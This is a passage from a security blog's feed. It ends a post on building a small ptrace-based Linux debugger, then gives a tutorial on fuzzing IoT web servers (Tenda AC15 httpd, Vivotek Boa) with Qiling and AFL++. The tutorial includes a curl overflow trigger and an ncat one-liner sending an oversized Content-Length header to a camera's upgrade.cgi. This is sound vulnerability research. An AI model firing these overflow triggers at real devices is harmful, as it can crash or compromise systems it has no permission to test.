keyword">if</span><span class="token punctuation">(</span><span class="token function">is_prefix</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"over"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">dbg_step_over</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Usage: step in / step over"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Unkown command: %s.\n"</span><span class="token punctuation">,</span> command<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token function">free</span><span class="token punctuation">(</span>lcmd<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这些是目前完成的功能，还有进程和线程支持还未完成</p><h2 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h2><p>​    一般debugger是要支持显示汇编的，这里实现的只是在每次单步和触发断点时打印寄存器信息和汇编。可以在每次单步或者触发断点时读取当前pc处的机器码借助capstone反汇编，<strong>但需要注意的是对于x86_64架构最长汇编指令为15字节但很少出现比较长的指令</strong>，所以实现汇编打印的时候每次仅读取16个字节进行反汇编并打印指令</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/** * consider of the longest instruction is 15bytes(x86_64) then we read 16bytes everytime * and disassemble it with capstone engine * befor invoking show_asm the caller should make sure current pc is not a breakpoint*/</span><span class="token keyword">void</span> <span class="token function">show_asm</span><span class="token punctuation">(</span>Debugger <span class="token operator">*</span>dbg<span class="token punctuation">)</span><span class="token punctuation">{</span>    csh handle<span class="token punctuation">;</span>    cs_insn <span class="token operator">*</span>insn<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> count<span class="token punctuation">;</span>    <span class="token class-name">uint8_t</span> <span class="token operator">*</span>code<span class="token punctuation">;</span>    <span class="token class-name">size_t</span> size <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token class-name">uint64_t</span> address<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">cs_open</span><span class="token punctuation">(</span>CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[error] cs_open(%d, %d, 0x%08lx)\n"</span><span class="token punctuation">,</span> CS_ARCH_X86<span class="token punctuation">,</span> CS_MODE_64<span class="token punctuation">,</span> <span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    code <span class="token operator">=</span> <span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    address <span class="token operator">=</span> <span class="token function">get_pc</span><span class="token punctuation">(</span>dbg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>code <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> address<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>code <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_PEEKDATA<span class="token punctuation">,</span> dbg<span class="token operator">-&gt;</span>d_pid<span class="token punctuation">,</span> address <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*before we show assembly after pc we should consider if there is breakpoint in machine code behind*/</span>    Breakpoint <span class="token operator">*</span>bp <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> tmp <span class="token operator">=</span> address<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">HASH_FIND_PTR</span><span class="token punctuation">(</span>dbg<span class="token operator">-&gt;</span>d_brks<span class="token punctuation">,</span> <span class="token operator">&amp;</span>tmp<span class="token punctuation">,</span> bp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>bp <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> bp<span class="token operator">-&gt;</span>b_enabled<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>code <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> bp<span class="token operator">-&gt;</span>b_saved_data<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        tmp<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"-------------------------[Assembly]-------------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    insn <span class="token operator">=</span> <span class="token function">cs_malloc</span><span class="token punctuation">(</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">cs_disasm_iter</span><span class="token punctuation">(</span>handle<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">uint8_t</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>code<span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">,</span> <span class="token operator">&amp;</span>address<span class="token punctuation">,</span> insn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>size <span class="token operator">+</span> insn<span class="token operator">-&gt;</span>size <span class="token operator">==</span> <span class="token number">15</span><span class="token punctuation">)</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\e[96m0x%08lx:\t%s\t%s\t&lt;======RIP\e[0m\n"</span><span class="token punctuation">,</span> insn<span class="token operator">-&gt;</span>address<span class="token punctuation">,</span> insn<span class="token operator">-&gt;</span>mnemonic<span class="token punctuation">,</span> insn<span class="token operator">-&gt;</span>op_str<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%08lx:\t%s\t%s\n"</span><span class="token punctuation">,</span> insn<span class="token operator">-&gt;</span>address<span class="token punctuation">,</span> insn<span class="token operator">-&gt;</span>mnemonic<span class="token punctuation">,</span> insn<span class="token operator">-&gt;</span>op_str<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token function">cs_free</span><span class="token punctuation">(</span>insn<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">cs_close</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>handle<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>还有就是如果读取的15个字节中<strong>有断点(0xcc)那么反汇编结果是不准确的</strong>，因此先遍历是否存在断点并resotre原来的数据再进行反汇编。</p><h1 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h1><p>​    这里还没有实现多线程/进程调试的功能，<a href="https://github.com/squarepants0/minidbg">源码</a>，但也算有个调试器的架子了</p><p><img src="https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230223/image-20230210153302686.5bym3zeddbk0.png" alt="image-20230210153302686"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><p><a href="https://github.com/kabeor/Capstone-Engine-Documentation/blob/master/Capstone-Engine%20Documentation.md">https://github.com/kabeor/Capstone-Engine-Documentation/blob/master/Capstone-Engine%20Documentation.md</a></p></li><li><p><a href="https://blog.tartanllama.xyz/writing-a-linux-debugger-setup/">Writing a Linux Debugger Part 1: Setup (tartanllama.xyz)</a>：作者讲解非常详细，还涉及源码调试功能，这里就没有加入该功能</p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzYzODg1OA==&amp;mid=2648465474&amp;idx=2&amp;sn=52dfd43e8f376e1ff16b2f81c3c002a7&amp;scene=21#wechat_redirect">一文看懂 | GDB底层实现原理</a></p></li><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3NzYzODg1OA==&amp;mid=2648466708&amp;idx=1&amp;sn=fd765d1e3c958c194010f35728e46fb0&amp;scene=21#wechat_redirect">自己动手写一个GDB｜基本功能</a></p></li><li><p><a href="https://github.com/squarepants0/minidbg">squarepants0/minidbg: Writing a minidbg on Linux with C (github.com)</a></p></li><li><p><a href="https://github.com/troydhanson/uthash">troydhanson/uthash: C macros for hash tables and more (github.com)</a></p></li><li><p><a href="https://github.com/antirez/linenoise">antirez/linenoise: A small self-contained alternative to readline and libedit (github.com)</a></p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;实现一个简单的调试器&quot;&gt;&lt;a href=&quot;#实现一个简单的调试器&quot; class=&quot;headerlink&quot; title=&quot;实现一个简单的调试器&quot;&gt;&lt;/a&gt;实现一个简单的调试器&lt;/h1&gt;&lt;p&gt;​    以经典的GDB为例其项目代码共有十几万行代码，但是很多情况下只会使</summary>
      
    
    
    
    <category term="二进制" scheme="https://rainsec.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
    
    <category term="二进制" scheme="https://rainsec.cn/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
  <entry>
    <title>qiling 框架IotFuzz之Boa</title>
    <link href="https://rainsec.cn/post/Qiling%20partial%20fuzz%20I.html"/>
    <id>https://rainsec.cn/post/Qiling%20partial%20fuzz%20I.html</id>
    <published>2023-01-30T04:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.351Z</updated>
    
    <content type="html"><![CDATA[<h1 id="qiling-框架IotFuzz之Boa"><a href="#qiling-框架IotFuzz之Boa" class="headerlink" title="qiling 框架IotFuzz之Boa"></a>qiling 框架IotFuzz之Boa</h1><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在搞Iot的时候接触到Qiling框架，用了一段时间后感觉确实模拟功能挺强大的，还支持Fuzz，于是开始学习对Iot webserver这样的程序进行Fuzz。</p><p>官方给出了类似的例子如Tenda AC15 的httpd的fuzz脚本，但是也就光秃秃一个脚本还是需要自己来一遍才能学到一些东西；因为面向的是Iot webserver的Fuzz因此需要对嵌入式设备中常用web开源框架有一些了解，这里是对于Boa框架的fuzz案例</p><hr><p><strong>环境准备</strong>：</p><ul><li><p>qiling-dev branch：这里并没有选择直接pip安装，方便修改源码</p></li><li><p>AFL++：在python中可以<code>import unicornafl</code>就行</p><ul><li>```bash<br>git clone <a href="https://github.com/AFLplusplus/AFLplusplus.git">https://github.com/AFLplusplus/AFLplusplus.git</a><br>make -C AFLplusplus<br>cd AFLplusplus/unicorn_mode ; ./build_unicorn_support.sh<pre class="line-numbers language-none"><code class="language-none">  - 一个坑是最好获取版本高于3.15的`cmake`要不然编译的时候有些cmake参数识别有问题，我遇到的就是:`cmake -S unicorn/ -B unicorn/build -D BUILD_SHARED_LIBS=no`问题- 需要对Qiling，AFL有些了解**Fuzz思路**：Iot设备就连环境模拟都比较棘手就就更别说Fuzz了，但是Qiling提供的`进程快照(snapshot)`功能给了我们一个不错的思路，这也是Qiling官方Fuzz案例的一个思路：**即对某函数部分Fuzz(Partial Fuzz)**# Tenda-AC15Qiling使用4个脚本来实现对该款路由器上httpd程序的Fuzz![image-20221213114209793](https://cdn.staticaly.com/gh/L2ksy0d/image-host@master/20230130/image-20221213114209793.1nvl9946t1hc.png)首先是`saver_tendaac15_httpd.py`用于保存fuzz的起始状态快照，主要代码如下：```pythondef save_context(ql, *args, **kw):    ql.save(cpu_context=False, snapshot="snapshot.bin")def check_pc(ql):    print("=" * 50)    print("Hit fuzz point, stop at PC = 0x%x" % ql.arch.regs.arch_pc)    print("=" * 50)    ql.emu_stop()def my_sandbox(path, rootfs):    ql = Qiling(path, rootfs, verbose=QL_VERBOSE.DEBUG)    ql.add_fs_mapper("/dev/urandom","/dev/urandom")    ql.hook_address(save_context, 0x10930)        #&lt;=======    ql.hook_address(patcher, ql.loader.elf_entry)    ql.hook_address(check_pc, 0x7a0cc)            #&lt;=======    ql.run()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ul><p>ql.hook_address(save_context, 0x10930)：表示当程序跑到0x10930地址时调用save_context函数将保存此刻模拟状态</p><p>但需要输入来触发程序按照预想的跑到0x10930位置，带上面脚本跑起来后使用<code>addressNat_overflow.sh</code>触发</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">curl</span> -v -H <span class="token string">"X-Requested-With: XMLHttpRequest"</span> -b <span class="token string">"password=1234"</span> -e http://localhost:8080/samba.html -H <span class="token string">"Content-Type:application/x-www-form-urlencoded"</span> --data <span class="token string">"entrys=sync"</span> --data <span class="token string">"page=CCCCAAAA"</span> http://localhost:8080/goform/addressNat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那么我们就获得了模拟进程快照<code>snapshot.bin</code>之后fuzz就重复利用该文件启动就行，对应<code>fuzz_tendaac15_httpd.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>input_file<span class="token punctuation">,</span> enable_trace<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    ql <span class="token operator">=</span> Qiling<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"rootfs/bin/httpd"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"rootfs"</span><span class="token punctuation">,</span> verbose<span class="token operator">=</span>QL_VERBOSE<span class="token punctuation">.</span>DEBUG<span class="token punctuation">,</span> console <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token keyword">if</span> enable_trace <span class="token keyword">else</span> <span class="token boolean">False</span><span class="token punctuation">)</span>    <span class="token comment"># save current emulated status</span>    ql<span class="token punctuation">.</span>restore<span class="token punctuation">(</span>snapshot<span class="token operator">=</span><span class="token string">"snapshot.bin"</span><span class="token punctuation">)</span>    <span class="token comment"># return should be 0x7ff3ca64</span>    fuzz_mem<span class="token operator">=</span>ql<span class="token punctuation">.</span>mem<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"CCCCAAAA"</span><span class="token punctuation">)</span>    target_address <span class="token operator">=</span> fuzz_mem<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">def</span> <span class="token function">place_input_callback</span><span class="token punctuation">(</span>_ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> _<span class="token punctuation">)</span><span class="token punctuation">:</span>        _ql<span class="token punctuation">.</span>mem<span class="token punctuation">.</span>write<span class="token punctuation">(</span>target_address<span class="token punctuation">,</span> <span class="token builtin">input</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">start_afl</span><span class="token punctuation">(</span>_ql<span class="token punctuation">:</span> Qiling<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        Callback from inside        """</span>        ql_afl_fuzz<span class="token punctuation">(</span>_ql<span class="token punctuation">,</span> input_file<span class="token operator">=</span>input_file<span class="token punctuation">,</span> place_input_callback<span class="token operator">=</span>place_input_callback<span class="token punctuation">,</span> exits<span class="token operator">=</span><span class="token punctuation">[</span>ql<span class="token punctuation">.</span>os<span class="token punctuation">.</span>exit_point<span class="token punctuation">]</span><span class="token punctuation">)</span>    ql<span class="token punctuation">.</span>hook_address<span class="token punctuation">(</span>callback<span class="token operator">=</span>start_afl<span class="token punctuation">,</span> address<span class="token operator">=</span><span class="token number">0x10930</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        ql<span class="token punctuation">.</span>run<span class="token punctuation">(</span>begin <span class="token operator">=</span> <span class="token number">0x10930</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token number">0x7a0cc</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> enable_trace<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nFuzzer Went Shit"</span><span class="token punctuation">)</span>        os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"No input file provided."</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">2</span> <span class="token keyword">and</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"-t"</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> enable_trace<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        main<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>恢复快照：ql.restore(snapshot=”snapshot.bin”)</p></li><li><p>变异数据缓存定位：fuzz_mem=ql.mem.search(b”CCCCAAAA”)</p></li><li><p>以hook方式从起始地址附近的开始fuzz：ql.hook_address(callback=start_afl, address=0x10930+8)</p></li></ul><p>最后开始Fuzz</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/sh</span><span class="token assign-left variable">AFL_DEBUG_CHILD_OUTPUT</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">AFL_AUTORESUME</span><span class="token operator">=</span><span class="token number">1</span> <span class="token assign-left variable">AFL_PATH</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span>realpath ./AFLplusplus<span class="token variable">)</span></span>"</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token variable">$AFL_PATH</span>:<span class="token environment constant">$PATH</span>"</span> ./AFLplusplus/afl-fuzz -i afl_inputs -o afl_outputs -U -- python3 ./fuzz_tendaac15_httpd.py @@<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>说实话这样连最关键的fuzz范围<code>0x10930</code>，<code>0x7a0cc</code>怎么来的都不知道当时逆向定位这两个地址也是一头雾水毫无特征，还是得自己实操</strong></p><p>因此选定了Boa框架(之前了解过源码)从零开始对其进行Fuzz</p><h1 id="Boa-Fuzz"><a href="#Boa-Fuzz" class="headerlink" title="Boa Fuzz"></a>Boa Fuzz</h1><p>选择一个网上有许多漏洞分析的设备：vivetok 摄像头，固件<a href="https://objects.githubusercontent.com/github-production-repository-file-5c1aeb/84257798/3128058?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=AKIAIWNJYAX4CSVEH53A/20221208/us-east-1/s3/aws4_request&amp;X-Amz-Date=20221208T052257Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=9a257e351faa9f25e49c6ddc70e3fe94bc94eed63d940d5c70fe1f71570f4120&amp;X-Amz-SignedHeaders=host&amp;actor_id=57476305&amp;key_id=0&amp;repo_id=84257798&amp;response-content-disposition=attachment;filename=CC8160-VVTK-0100d.flash.zip&amp;response-content-type=application/x-zip-compressed">链接</a>；而且webservre为Boa框架</p><p>Poc：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> -en <span class="token string">"POST /cgi-bin/admin/upgrade.cgi HTTP/1.0<span class="token entity" title="\n">\n</span>Content-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX<span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span>  <span class="token operator">|</span> ncat -v <span class="token number">192.168</span>.57.20 <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><em><strong>Boa框架</strong></em>：</p><p>主要处理逻辑在<code>process_requests</code>函数中：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">       <span class="token comment">/*获取就绪队列并处理*/</span>current <span class="token operator">=</span> request_ready<span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>current<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">time</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>current_time<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>buffer_end <span class="token operator">&amp;&amp;</span> <span class="token comment">/* there is data in the buffer */</span>        current<span class="token operator">-&gt;</span>status <span class="token operator">!=</span> DEAD <span class="token operator">&amp;&amp;</span> current<span class="token operator">-&gt;</span>status <span class="token operator">!=</span> DONE<span class="token punctuation">)</span> <span class="token punctuation">{</span>        retval <span class="token operator">=</span> <span class="token function">req_flush</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">/*         * retval can be -2=error, -1=blocked, or bytes left         */</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* error */</span>            current<span class="token operator">-&gt;</span>status <span class="token operator">=</span> DEAD<span class="token punctuation">;</span>            retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">/* notice the &gt;= which is different from below?               Here, we may just be flushing headers.               We don't want to return 0 because we are not DONE               or DEAD */</span>            retval <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment">/*主要处理请求部分在这里*/</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>current<span class="token operator">-&gt;</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">case</span> READ_HEADER<span class="token operator">:</span>        <span class="token keyword">case</span> ONE_CR<span class="token operator">:</span>        <span class="token keyword">case</span> ONE_LF<span class="token operator">:</span>        <span class="token keyword">case</span> TWO_CR<span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token function">read_header</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//解析request头部，该函数类似与FILE_IO</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token comment">//函数request内部有8192+1字节的buffer，data的头尾指针等，最终调用</span>        <span class="token keyword">case</span> BODY_READ<span class="token operator">:</span>                       <span class="token comment">//bytes = read(req-&gt;fd, buffer + req-&gt;client_stream_pos, buf_bytes_left);读取</span>            retval <span class="token operator">=</span> <span class="token function">read_body</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> BODY_WRITE<span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token function">write_body</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> WRITE<span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token function">process_get</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> PIPE_READ<span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token function">read_from_pipe</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> PIPE_WRITE<span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token function">write_from_pipe</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> DONE<span class="token operator">:</span>            <span class="token comment">/* a non-status that will terminate the request */</span>            retval <span class="token operator">=</span> <span class="token function">req_flush</span><span class="token punctuation">(</span>current<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">/*             * retval can be -2=error, -1=blocked, or bytes left             */</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment">/* error */</span>                current<span class="token operator">-&gt;</span>status <span class="token operator">=</span> DEAD<span class="token punctuation">;</span>                retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>retval <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                retval <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> DEAD<span class="token operator">:</span>            retval <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            current<span class="token operator">-&gt;</span>buffer_end <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>          